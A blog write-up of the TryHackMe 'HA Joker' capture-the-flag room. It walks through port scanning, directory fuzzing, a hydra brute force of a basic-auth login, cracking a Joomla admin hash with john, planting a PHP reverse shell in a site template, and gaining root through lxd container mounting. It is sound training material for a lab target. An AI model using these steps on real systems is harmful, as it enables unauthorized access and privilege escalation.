---
layout: post
author: L0
---

![image](/images/Pasted image 20221202085900.png)

[link](https://tryhackme.com/room/jokerctf)

## Enumeration

### nmap

```shell
$ sudo nmap -sV -p- hajoker

Nmap scan report for hajoker (10.10.63.57)
Host is up (0.043s latency).
rDNS record for 10.10.63.57: hajoker.thm
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.29
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

after nmap scan i found 3 open ports.

- `22` - ssh service
- `80` - apache web server
- `8080` - another apache web server

### website

first checking the webpage. nothing special.

`http://hajoker.thm`

![image](/images/Pasted image 20221202090354.png)

`http://hajoker.thm:8080`

the other webpage was a login page. i had to find the credentials.

![image](/images/Pasted image 20221202090523.png)

### dirbusting

```shell
$ ffuf -w `fzf-wordlist` -u http://hajoker.thm/FUZZ -e ".txt"


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://hajoker.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htpasswd.txt           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 45ms]
.htaccess.txt           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 44ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3156ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3163ms]
                        [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 4123ms]
.hta.txt                [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4160ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4173ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 41ms]
img                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 38ms]
index.html              [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 39ms]
phpinfo.php             [Status: 200, Size: 94854, Words: 4706, Lines: 1160, Duration: 48ms]
secret.txt              [Status: 200, Size: 320, Words: 62, Lines: 7, Duration: 41ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 39ms]
:: Progress: [9228/9228] :: Job [1/1] :: 998 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

`secret.txt` seems to be the next step.

![image](/images/Pasted image 20221202093049.png)

the content was just a conversation between `joker` and `batman`
so i tried to brute force into the login page. first i checked the request with burp.
the authorization is base64 encoded.

### brute force login page

![image](/images/Pasted image 20221202094518.png)

with hydra i had luck with the username `joker`

```shell
$ hydra -I -t 16 -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 -f hajoker.thm http-get
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-02 03:38:44
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-get://hajoker.thm:8080/
[8080][http-get] host: hajoker.thm   login: joker   password: h****h
[STATUS] attack finished for hajoker.thm (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-02 03:39:11
```

after the login i was presented with a joomla blog.

![image](/images/Pasted image 20221202094007.png)

nothing special on the site. so doing another dirbusting run.

```shell
$ ffuf -w `fzf-wordlist` -u http://hajoker.thm:8080/FUZZ -H "Authorization: Basic am9rZXI6aGFubmFo"

administrator           [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 40ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1736ms]
backup                  [Status: 200, Size: 12133560, Words: 0, Lines: 0, Duration: 0ms]
bin                     [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 39ms]
cache                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 40ms]
components              [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 40ms]
                        [Status: 200, Size: 10920, Words: 776, Lines: 218, Duration: 3798ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4165ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4209ms]
images                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 38ms]
includes                [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 40ms]
index.php               [Status: 200, Size: 10941, Words: 776, Lines: 218, Duration: 101ms]
language                [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 40ms]
layouts                 [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 39ms]
libraries               [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 40ms]
LICENSE                 [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 135ms]
media                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 39ms]
modules                 [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 40ms]
plugins                 [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 48ms]
README                  [Status: 200, Size: 4494, Words: 481, Lines: 73, Duration: 48ms]
robots                  [Status: 200, Size: 836, Words: 88, Lines: 33, Duration: 42ms]
robots.txt              [Status: 200, Size: 836, Words: 88, Lines: 33, Duration: 40ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 40ms]
templates               [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 44ms]
tmp                     [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 40ms]
web.config              [Status: 200, Size: 1690, Words: 482, Lines: 32, Duration: 152ms]
:: Progress: [4614/4614] :: Job [1/1] :: 1004 req/sec :: Duration: [0:00:08] :: Errors: 0 ::

```

i found a backup of the server and downloaded the file to my box. it was a zip file with a password protection. i used the same password as with the login page and got the content unziped.

```shell
┌──(j0j0pupp3㉿bAs3)-[~/THM/hajokerctf/db]
└─$ ls
joomladb.sql
```

the interesting part was the database backup.
i opened it with vim and searched for password.

```shell
INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin',
'admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',
0,1,'2019-10-08 12:00:15','2019-10-25
15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\
"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;
UNLOCK TABLES;

```

i found the user `admin` with the pw hash.

```shell
hash: $2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG
```

with john i got the password and was able to login to the admin panel.

```shell
$ john --wordlist=/usr/share/wordlists/rockyou.txt dbhash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
a*****34         (?)
1g 0:00:00:03 DONE (2022-12-02 03:56) 0.2958g/s 306.2p/s 306.2c/s 306.2C/s bobby..tyrone
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

![image](/images/Pasted image 20221202210953.png)

after trying to upload a shell i found the template page.

```shell
$ cp /usr/share/webshells/php/php-reverse-shell.php
```

instead of uploading a file i copied the kali php webshell into the index.php site and got a shell on my system.

![image](/images/Pasted image 20221202211309.png)

![image](/images/Pasted image 20221202211413.png)

i saw that i was member of the `lxd` group. so this was very much the possible attack vector.
i checked the image list and got one.

```shell
www-data@ubuntu:/$ lxc image list
+-------+--------------+--------+-------------+--------+--------+------------------------------+
| ALIAS | FINGERPRINT  | PUBLIC | DESCRIPTION |  ARCH  |  SIZE  |         UPLOAD DATE          |
+-------+--------------+--------+-------------+--------+--------+------------------------------+
|       | a8258f4a885f | no     |             | x86_64 | 2.39MB | Oct 25, 2019 at 8:07pm (UTC) |
+-------+--------------+--------+-------------+--------+--------+------------------------------+

```

unfortunately i messed up and had to create another image on my system.

```shell
git clone https://github.com/lxc/distrobuilder
#Make distrobuilder
cd distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
```

uploading both files to the victim via python webserver.

```shell
www-data@ubuntu:/tmp$ lsc image import lxd.tar.xz rootfs.squashfs --alias alpine
```

this image worked as intended.

```shell
www-data@ubuntu:/tmp$ lxc image list
+--------+--------------+--------+----------------------------------------+--------+--------+-----------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |              DESCRIPTION               |  ARCH  |  SIZE  |         UPLOAD DATE         |
+--------+--------------+--------+----------------------------------------+--------+--------+-----------------------------+
| alpine | aef4ed7c5957 | no     | Alpinelinux 3.8 x86_64 (20221202_2028) | x86_64 | 1.96MB | Dec 2, 2022 at 8:31pm (UTC) |
+--------+--------------+--------+----------------------------------------+--------+--------+-----------------------------+
```

```shell
www-data@ubuntu:/tmp$ lxc init alpine privesc -c security.privileged=true
Creating privesc
www-data@ubuntu:/tmp$ lxc list
+---------+---------+------+------+------------+-----------+
|  NAME   |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+---------+---------+------+------+------------+-----------+
| privesc | STOPPED |      |      | PERSISTENT | 0         |
+---------+---------+------+------+------------+-----------+
```

```shell
www-data@ubunut:/tmp$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc
```

after starting and executing the container i was root and could navigate to the root folder on the victim.

```shell
www-data@ubuntu:/tmp$ lxc start privesc
www-data@ubuntu:/tmp$ lxc exec privesc /bin/sh
~ # whoami
root
```

```shell
~ # cd ..
/ # cd mnt
/mnt # ls
root
/mnt # cd root
/mnt/root # cd root/
/mnt/root/root # ls
final.txt
```

i found the `final.txt` file and finished the box.

![image](/images/Pasted image 20221202214116.png)

[L0]